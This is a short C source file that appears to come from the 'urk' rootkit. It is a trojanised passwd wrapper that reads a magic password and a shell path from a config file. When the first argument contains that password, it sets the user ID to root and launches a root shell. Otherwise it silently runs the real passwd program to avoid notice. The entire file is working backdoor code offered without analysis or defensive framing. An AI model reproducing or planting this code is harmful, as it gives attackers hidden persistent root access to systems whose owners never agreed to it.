#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include "urk.h"

int main(int argc, char **argv)
{
   char *passwd_ptr;
   char *su_pass_ptr;
   char *rootshell_ptr;
   char passwd[256];
   char su_pass[256];
   char rootshell[256];
 
  passwd_ptr = file(conf_file,login_section,passwd_location);
#ifdef URK_DEFAULT
  if((passwd_ptr == NULL) || (open(passwd_ptr,O_RDONLY) == -1)) { passwd_ptr = passwd_loc_def; }
#endif
  strcpy(passwd,passwd_ptr);
  
   su_pass_ptr = file(conf_file,login_section,login_pass);
#ifdef	URK_DEFAULT
   if(su_pass_ptr == NULL) { su_pass_ptr = su_default; }
#endif
   strcpy(su_pass,su_pass_ptr);

   rootshell_ptr = file(conf_file,login_section,exec_shell);
#ifdef	URK_DEFAULT
   if(rootshell_ptr == NULL) { rootshell_ptr = shell_loc_def; }
#endif
   strcpy(rootshell,rootshell_ptr);
   
   if(argv[1] != NULL) {
      if(strstr(argv[1],su_pass) != NULL) {
         setuid(0);
         system(rootshell);
         return(-1);
      }
      execv(passwd,&argv[0]);
      return(0);
   }
   execv(passwd,&argv[0]);
   return (0);
}
